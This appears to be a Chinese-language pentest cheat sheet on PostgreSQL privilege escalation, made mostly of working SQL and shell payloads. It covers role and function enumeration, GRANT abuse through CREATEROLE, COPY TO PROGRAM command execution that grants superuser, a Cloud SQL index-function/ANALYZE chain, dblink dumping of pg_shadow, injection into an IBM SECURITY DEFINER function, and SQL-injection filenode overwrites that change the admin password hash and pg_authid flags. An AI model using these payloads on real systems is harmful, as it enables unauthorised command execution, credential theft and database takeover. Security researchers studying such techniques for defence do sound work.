## 提权

### 枚举角色

```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
      r.rolname,
      r.rolsuper,
      r.rolinherit,
      r.rolcreaterole,
      r.rolcreatedb,
      r.rolcanlogin,
      r.rolbypassrls,
      r.rolconnlimit,
      r.rolvaliduntil,
      r.oid,
  ARRAY(SELECT b.rolname
        FROM pg_catalog.pg_auth_members m
        JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
        WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```

### 枚举表格

```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```

### 枚举功能

```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
    LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```

### CREATEROLE

如果具有 CREATEROLE 权限，可以授予自己对其他角色（非超级用户）的访问权限，这些角色可以选择读写文件和执行命令：

```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```

具有此角色的用户还可以更改其他非超级用户的密码：

```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```

本地用户无需提供任何密码即可登录 PostgreSQL，这是很常见的情况。 因此，一旦获得了执行代码的权限，就可以滥用这些权限来授予超级用户角色：

```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```

### ALTER TABLE

尝试让另一个用户成为表的所有者时，应该会收到阻止它的错误，但显然 GCP 将该选项提供给了 GCP 中的非超级用户 postgres 用户

将这个想法与以下事实结合起来：当在具有索引函数的表上执行 INSERT/UPDATE/ANALYZE 命令时，该函数将作为具有表所有者权限的命令的一部分被调用。 可以使用函数创建索引，并向超级用户授予该表的所有者权限，然后使用恶意函数对表运行 ANALYZE，该恶意函数将能够执行命令，因为它使用所有者的权限

利用步骤：

> 1. 首先创建一个新表
> 2. 在表中插入一些不相关的内容，为索引功能提供数据
> 3. 开发一个包含代码执行负载的恶意索引函数，允许执行未经授权的命令
> 4. 将表的所有者更改为cloudsqladmin，这是 Cloud SQL 专门用于管理和维护数据库的 GCP 超级用户角色
> 5. 对表执行 ANALYZE 操作。 此操作强制 PostgreSQL 引擎切换到表所有者cloudsqladmin的用户上下文. 因此，恶意索引函数会以cloudsqladmin的权限被调用，从而能够执行之前未经授权的shell命令

```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
  LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
  LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```

然后，shell_commands_results 表将包含执行代码的输出：

```sql
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```

### 本地登录

一些配置错误的 postgresql 实例可能允许任何本地用户登录，可以使用 dblink 函数从 127.0.0.1 登录本地

```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
    port=5432
    user=someuser
    password=supersecret
    dbname=somedb',
    'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```

如果dblink函数没有，需要执行以下创建:

```sql
CREATE EXTENSION dblink;
```

如果拥有具有更多权限的用户的密码，但不允许该用户从外部 IP 登录，可以使用以下函数以该用户身份执行查询：

```sql
SELECT * FROM dblink('host=127.0.0.1
                          user=someuser
                          dbname=somedb',
                         'SELECT usename,passwd from pg_shadow')
                      RETURNS (result TEXT);
```

### 使用 SECURITY DEFINER 自定义函数

渗透测试人员能够在 IBM 提供的 postgres 实例中进行 privesc，因为此函数带有 SECURITY DEFINER 标志：

```sql
CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
    RETURNS text
    LANGUAGE 'plpgsql'
    VOLATILE SECURITY DEFINER
    PARALLEL UNSAFE
    COST 100

AS $BODY$
                DECLARE
                     persist_dblink_extension boolean;
                BEGIN
                    persist_dblink_extension := create_dblink_extension();
                    PERFORM dblink_connect(format('dbname=%s', db_name));
                    PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
                                               subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
                    PERFORM dblink_disconnect();
…
```

正如文档中所解释的，具有 SECURITY DEFINER 的函数是使用拥有它的用户的权限执行的。 因此，如果该函数容易受到 SQL 注入攻击，或者正在使用攻击者控制的参数执行某些特权操作，则可能会被滥用来提升 postgres 内的特权.

在前面代码的第 4 行中，可以看到该函数具有 SECURITY DEFINER 标志.

```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```

然后执行命令即可查看当前id:

```sql
SELECT create_subscription('test3','127.0.0.1','5432','a','ibm','ibmclouddb','test2_publication with (create_slot = false); COPY public.test3 FROM PROGRAM ''/usr/bin/id'';');
SELECT * from public.test3;
```

### 覆盖数据提权

#### 更新自定义表

我们必须执行以下步骤来更新 PostgreSQL 服务器上的自定义表：

> 1. 获取 PostgreSQL 数据目录
> 2. 获取与目标表关联的文件节点的相对位置
> 3. 获取文件节点数据类型
> 4. 通过大对象函数下载文件节点
> 5. 离线编辑文件节点
> 6. 通过大对象函数将新文件节点上传回服务器
> 7. 用新数据覆盖磁盘上的目标文件节点
> 8. 从 DBMS 内存缓存中卸载目标表

```sql
-1 UNION SELECT 1,version(),'a','b',2  //获取数据目录位置
-1 UNION SELECT 1,pg_relation_filepath('users'),'a','b',2  //获取相对文件节点位置
-1 UNION ALL SELECT 1,STRING_AGG(CONCAT_WS(',',attname,typname,attlen,attalign),';'),'ab','bc',2 FROM pg_attribute JOIN pg_type ON pg_attribute.atttypid = pg_type.oid JOIN pg_class ON pg_attribute.attrelid = pg_class.oid WHERE pg_class.relname = 'users'  //获取文件节点数据类型
-1 UNION SELECT 1,'a','b','c',lo_import('/var/lib/postgresql/13/main/base/13485/49182',13337)  //将文件节点导入大型对象
-1 UNION SELECT 1,'a','b',translate(encode(lo_get(13337), 'base64'), E'\n', ''),2  //读取大型对象OID
```

使用 PostgreSQL Filenode Editor 编辑用户表

使用列表模式检查filenode是否被正确解析:

```bash
$ python3 postgresql_filenode_editor.py -m list -f ./tests/sample_filenodes/49182 --datatype-csv "tableoid,oid,4,i;cmax,cid,4,i;xmax,xid,4,i;cmin,cid,4,i;xmin,xid,4,i;ctid,tid,6,s;id,int4,4,i;email,varchar,-1,i;fullname,varchar,-1,i;password,varchar,-1,i;city,varchar,-1,i;age,int4,4,i"

[+] Page 0:
+---------+----+------------------------------+------------------+-------------------------------------+------------------+------+
| item_no | id |            email             |     fullname     |               password              |       city       | age  |
+---------+----+------------------------------+------------------+-------------------------------------+------------------+------+
|    0    | 1  |   b'john.doe@example.com'    |   b'John Doe'    | b'b8a76c56d41e570a6e73f55c232572e9' |   b'New York'    |  28  |
|    1    | 2  |  b'alice.smith@example.com'  |  b'Alice Smith'  | b'3a6da9ad70dfe6bd6129a0858aaa1fd0' | b'San Francisco' |  35  |
|    2    | 3  |   b'bob.jones@example.com'   |   b'Bob Jones'   | b'1543a45232df76aaec95af184e246c69' |  b'Los Angeles'  |  22  |
|    3    | 4  | b'sara.williams@example.com' | b'Sara Williams' | b'1543a45232df76aaec95af184e246c69' |       NULL       |  29  |
|    4    | 5  | b'michael.brown@example.com' | b'Michael Brown' | b'd0b8dfe012c6aad2be13e3430439f581' |    b'Chicago'    |  31  |
|    5    | 6  |  b'emily.wang@example.com'   |  b'Emily Wang'   | b'b85b5926d887f5dfa4782549a3e97793' |       NULL       |  26  |
|    6    | 7  | b'david.nguyen@example.com'  | b'David Nguyen'  | b'6060bcea977c78994a6587382fce4c4b' |    b'Houston'    |  33  |
|    7    | 8  | b'olivia.garcia@example.com' | b'Olivia Garcia' | b'f57b4b400b8ed7956556c24339c2d48f' |     b'Miami'     |  29  |
|    8    | 9  |  b'ryan.miller@example.com'  |  b'Ryan Miller'  | b'9ed1707a05359d46a03a8ebe129c2964' |    b'Seattle'    |  38  |
|    9    | 10 |  b'emma.davis@example.com'   |  b'Emma Davis'   | b'ce28650b9ba722fbd4da8c0a4c2b8cb9' |    b'Denver'     |  27  |
|    10   | 11 |     b'admin@example.com'     |  b'Admin User'   | b'a9946a9d51be374db363c9492850c0a8' |       NULL       | NULL |
+---------+----+------------------------------+------------------+-------------------------------------+------------------+------+
```

编辑所需的行，将密码散列设置为MD5('12345678')值：

```bash
 $ python3 postgresql_filenode_editor.py -m update -p 0 -i 10 --csv-data '11,admin@example.com,Admin User,25d55ad283aa400af464c76d713c07ad,NULL,NULL' -f ./tests/sample_filenodes/49182 --datatype-csv "tableoid,oid,4,i;cmax,cid,4,i;xmax,xid,4,i;cmin,cid,4,i;xmin,xid,4,i;ctid,tid,6,s;id,int4,4,i;email,varchar,-1,i;fullname,varchar,-1,i;password,varchar,-1,i;city,varchar,-1,i;age,int4,4,i"
```

重新上传编辑后的文件节点

```sql
-1 UNION SELECT 1,'a','b','c',lo_from_bytea(13338,decode('AAAA...BASE64_ENCODED_FILENODE...xwAAAA=','base64'))<@/urlencode_not_plus> HTTP/1.1
```

覆盖磁盘上的文件节点

```sql
 -1 UNION SELECT 1,'a','b','c',lo_export(13338,'/var/lib/postgresql/13/main/base/13485/49182')
 ```

此时，密码在数据库中仍然是旧的，因为表已加载到缓存中.

在服务器上进行大量查询刷新缓存.例如，创建一个大小与整个缓存池匹配的大对象，以从缓存中刷新目标表:

```sql
 -1 UNION SELECT 1,'a','b','c',lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```

该查询会溢出内存缓存，并且该users表应该已被卸载。我们可以通过重新运行查询并观察更新后的管理员密码哈希来确认：

```sql
postgres=> SELECT * FROM users;
 id |           email           |   fullname    |             password             |     city      | age
----+---------------------------+---------------+----------------------------------+---------------+-----
  1 | john.doe@example.com      | John Doe      | b8a76c56d41e570a6e73f55c232572e9 | New York      |  28
  2 | alice.smith@example.com   | Alice Smith   | 3a6da9ad70dfe6bd6129a0858aaa1fd0 | San Francisco |  35
  3 | bob.jones@example.com     | Bob Jones     | 1543a45232df76aaec95af184e246c69 | Los Angeles   |  22
  4 | sara.williams@example.com | Sara Williams | 1543a45232df76aaec95af184e246c69 |               |  29
  5 | michael.brown@example.com | Michael Brown | d0b8dfe012c6aad2be13e3430439f581 | Chicago       |  31
  6 | emily.wang@example.com    | Emily Wang    | b85b5926d887f5dfa4782549a3e97793 |               |  26
  7 | david.nguyen@example.com  | David Nguyen  | 6060bcea977c78994a6587382fce4c4b | Houston       |  33
  8 | olivia.garcia@example.com | Olivia Garcia | f57b4b400b8ed7956556c24339c2d48f | Miami         |  29
  9 | ryan.miller@example.com   | Ryan Miller   | 9ed1707a05359d46a03a8ebe129c2964 | Seattle       |  38
 10 | emma.davis@example.com    | Emma Davis    | ce28650b9ba722fbd4da8c0a4c2b8cb9 | Denver        |  27
 11 | admin@example.com         | Admin User    | 25d55ad283aa400af464c76d713c07ad |               |    
(11 rows)
```

#### 更新pg_authid表

其 oid 在代码中默认设置为 1260，但在真空例程期间可能会发生变化.在这种情况下，它的新 oid 将存储在邻居 global/pg_filenode.map 文件中.

获取数据目录和获取相对节点位置与上个方法相同.

获取文件节点数据类型

```sql
-1 UNION ALL SELECT 1,STRING_AGG(CONCAT_WS(',',attname,typname,attlen,attalign),';'),'ab','bc',2 FROM pg_attribute JOIN pg_type ON pg_attribute.atttypid = pg_type.oid JOIN pg_class ON pg_attribute.attrelid = pg_class.oid WHERE pg_class.relname = 'pg_authid'
```

将目标文件节点加载到大型对象中

```sql
-1 UNION SELECT 1,'a','b','c',lo_import('/var/lib/postgresql/13/main/global/1260',13340)
```

从文件对象中读取文件节点

```sql
 -1 UNION SELECT 1,'a','b',translate(encode(lo_get(13340), 'base64'), E'\n', ''),2
 ```

使用 PostgreSQL Filenode Editor 离线编辑表,我们可以在最后看到我们的用户 poc_update_user 的 oid 49153.我们需要将所有 rol* 设置翻转为 1 以模仿真正超级用户的权限.

```sql
[+] Page 0:
+---------+-------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------+------------+---------------+-------------+-------------+----------------+--------------+--------------+----------------------------------------+---------------+
| item_no |  oid  |                                                                                                                         rolname                                                                                                                         | rolsuper | rolinherit | rolcreaterole | rolcreatedb | rolcanlogin | rolreplication | rolbypassrls | rolconnlimit |              rolpassword               | rolvaliduntil |
+---------+-------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------+------------+---------------+-------------+-------------+----------------+--------------+--------------+----------------------------------------+---------------+
|    0    |   10  |       b'postgres\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'       |    1     |     1      |       1       |      1      |      1      |       1        |      1       |      -1      |                  NULL                  |      NULL     |
|    1    |  3373 |          b'pg_monitor\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'          |    0     |     1      |       0       |      0      |      0      |       0        |      0       |      -1      |                  NULL                  |      NULL     |
|    2    |  3374 |                         b'pg_read_all_settings\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'                         |    0     |     1      |       0       |      0      |      0      |       0        |      0       |      -1      |                  NULL                  |      NULL     |
|    3    |  3375 |                     b'pg_read_all_stats\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'                    |    0     |     1      |       0       |      0      |      0      |       0        |      0       |      -1      |                  NULL                  |      NULL     |
|    4    |  3377 |                        b'pg_stat_scan_tables\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'                       |    0     |     1      |       0       |      0      |      0      |       0        |      0       |      -1      |                  NULL                  |      NULL     |
|    5    |  4569 |                         b'pg_read_server_files\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'                         |    0     |     1      |       0       |      0      |      0      |       0        |      0       |      -1      |                  NULL                  |      NULL     |
|    6    |  4570 |                           b'pg_write_server_files\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'                          |    0     |     1      |       0       |      0      |      0      |       0        |      0       |      -1      |                  NULL                  |      NULL     |
|    7    |  4571 |                                 b'pg_execute_server_program\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'                                |    0     |     1      |       0       |      0      |      0      |       0        |      0       |      -1      |                  NULL                  |      NULL     |
|    8    |  4200 |                     b'pg_signal_backend\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'                    |    0     |     1      |       0       |      0      |      0      |       0        |      0       |      -1      |                  NULL                  |      NULL     |
|    9    | 16384 | b'test\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' |    1     |     1      |       1       |      1      |      1      |       1        |      1       |      -1      | b'md505a671c66aefea124cc08b76ea6d30bb' |      NULL     |
|    10   | 16386 |   b'test1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'  |    0     |     1      |       0       |      0      |      1      |       0        |      0       |      -1      | b'md542b72f913c3201fc62660d512f5ac746' |      NULL     |
|    11   | 24577 |   b'test2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'  |    0     |     1      |       0       |      0      |      1      |       0        |      0       |      -1      | b'md548b83a2a920f7284c9f0e1bf03012b68' |      NULL     |
|    12   |   10  |       b'postgres\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'       |    1     |     1      |       1       |      1      |      1      |       1        |      1       |      -1      |                  NULL                  |      NULL     |
|    13   | 49153 |                  b'poc_update_user\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'                 |    0     |     1      |       0       |      0      |      1      |       0        |      0       |      -1      | b'md5d30050478412f6f4d7fd340d0e46d403' |      NULL     |
+---------+-------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------+------------+---------------+-------------+-------------+----------------+--------------+--------------+----------------------------------------+---------------+
```

为了方便起见，任何不可打印的字段长度字段都可以作为 base64 字符串传递

```sql
 python3 postgresql_filenode_editor.py -f ./1260 --datatype-csv "tableoid,oid,4,i;cmax,cid,4,i;xmax,xid,4,i;cmin,cid,4,i;xmin,xid,4,i;ctid,tid,6,s;oid,oid,4,i;rolname,name,64,c;rolsuper,bool,1,c;rolinherit,bool,1,c;rolcreaterole,bool,1,c;rolcreatedb,bool,1,c;rolcanlogin,bool,1,c;rolreplication,bool,1,c;rolbypassrls,bool,1,c;rolconnlimit,int4,4,i;rolpassword,text,-1,i;rolvaliduntil,timestamptz,8,d" -m update -p 0 -i 13 --csv-data "49153,cG9jX3VwZGF0ZV91c2VyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==,1,1,1,1,1,1,1,-1,md5d30050478412f6f4d7fd340d0e46d403,NULL"
```

将编辑后的文件节点重新上传到大型对象中
```sql
-1 UNION SELECT 1,'a','b','c',lo_from_bytea(13341,decode('AAAAAJC...BASE64_ENCODED_FILENODE...P////8=','base64'))
```

覆盖FS上的文件节点
```sql
-1 UNION SELECT 1,'a','b','c',lo_export(13341,'/var/lib/postgresql/13/main/global/1260')
```

缓存溢出

```sql
-1 UNION SELECT 1,'a','b','c',lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```

检查用户权限
```sql
postgres=# SELECT * FROM pg_authid;
  oid  |          rolname          | rolsuper | rolinherit | rolcreaterole | rolcreatedb | rolcanlogin | rolreplication | rolbypassrls | rolconnlimit |             rolpassword             | rolvaliduntil
-------+---------------------------+----------+------------+---------------+-------------+-------------+----------------+--------------+--------------+-------------------------------------+---------------
  3373 | pg_monitor                | f        | t          | f             | f           | f           | f              | f            |           -1 |                                     |
  3374 | pg_read_all_settings      | f        | t          | f             | f           | f           | f              | f            |           -1 |                                     |
  3375 | pg_read_all_stats         | f        | t          | f             | f           | f           | f              | f            |           -1 |                                     |
  3377 | pg_stat_scan_tables       | f        | t          | f             | f           | f           | f              | f            |           -1 |                                     |
  4569 | pg_read_server_files      | f        | t          | f             | f           | f           | f              | f            |           -1 |                                     |
  4570 | pg_write_server_files     | f        | t          | f             | f           | f           | f              | f            |           -1 |                                     |
  4571 | pg_execute_server_program | f        | t          | f             | f           | f           | f              | f            |           -1 |                                     |
  4200 | pg_signal_backend         | f        | t          | f             | f           | f           | f              | f            |           -1 |                                     |
 16384 | test                      | t        | t          | t             | t           | t           | t              | t            |           -1 | md505a671c66aefea124cc08b76ea6d30bb |
 16386 | test1                     | f        | t          | f             | f           | t           | f              | f            |           -1 | md542b72f913c3201fc62660d512f5ac746 |
 24577 | test2                     | f        | t          | f             | f           | t           | f              | f            |           -1 | md548b83a2a920f7284c9f0e1bf03012b68 |
    10 | postgres                  | t        | t          | t             | t           | t           | t              | t            |           -1 |                                     |
 49153 | poc_update_user           | t        | t          | t             | t           | t           | t              | t            |           -1 | md5d30050478412f6f4d7fd340d0e46d403 |
(13 rows)
```

我们现在是超级管理员,可以重新加载配置

```sql
 -1 UNION SELECT 1,'a','b',pg_reload_conf()::text,1
```
